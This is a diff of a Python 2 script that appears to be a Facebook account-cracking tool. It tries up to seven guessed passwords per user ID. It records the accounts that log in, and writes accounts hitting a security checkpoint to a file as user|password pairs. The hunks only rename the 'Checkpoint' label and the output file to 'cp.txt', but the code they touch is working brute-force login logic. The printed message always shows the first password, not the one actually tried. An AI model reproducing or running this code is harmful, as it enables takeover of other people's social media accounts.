@@ -317,8 +317,8 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
-					cek = open("out/checkpoint.txt", "a")
+					print '\x1b[1;91mCp\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
+					cek = open("out/cp.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
 					cp.append(user+pass1)
@@ -331,8 +331,8 @@ def pilih_super():
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
-							cek = open("out/checkpoint.txt", "a")
+							print '\x1b[1;91mCp\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
+							cek = open("out/cp.txt", "a")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
 							cp.append(user+pass2)
@@ -345,8 +345,8 @@ def pilih_super():
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
-									cek = open("out/checkpoint.txt", "a")
+									print '\x1b[1;91mCp\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
+									cek = open("out/cp.txt", "a")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
 									cp.append(user+pass3)
@@ -359,8 +359,8 @@ def pilih_super():
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
-											cek = open("out/checkpoint.txt", "a")
+											print '\x1b[1;91mCp\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
+											cek = open("out/cp.txt", "a")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
 											cp.append(user+pass4)
@@ -373,8 +373,8 @@ def pilih_super():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
-													cek = open("out/checkpoint.txt", "a")
+													print '\x1b[1;91mCp\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
+													cek = open("out/cp.txt", "a")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
 													cp.append(user+pass5)
@@ -387,8 +387,8 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
-															cek = open("out/checkpoint.txt", "a")
+															print '\x1b[1;91mCp\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
+															cek = open("out/cp.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
 															cp.append(user+pass6)
@@ -403,8 +403,8 @@ def pilih_super():
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;91mCheckpoint\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
-																	cek = open("out/checkpoint.txt", "a")
+																	print '\x1b[1;91mCp\x1b[1;97m-\x1b[1;91m✧\x1b[1;97m-' + user + '-\x1b[1;91m✧\x1b[1;97m-' + pass1 + ' ✔ ' + b['name']
+																	cek = open("out/cp.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cp.append(user+pass7)
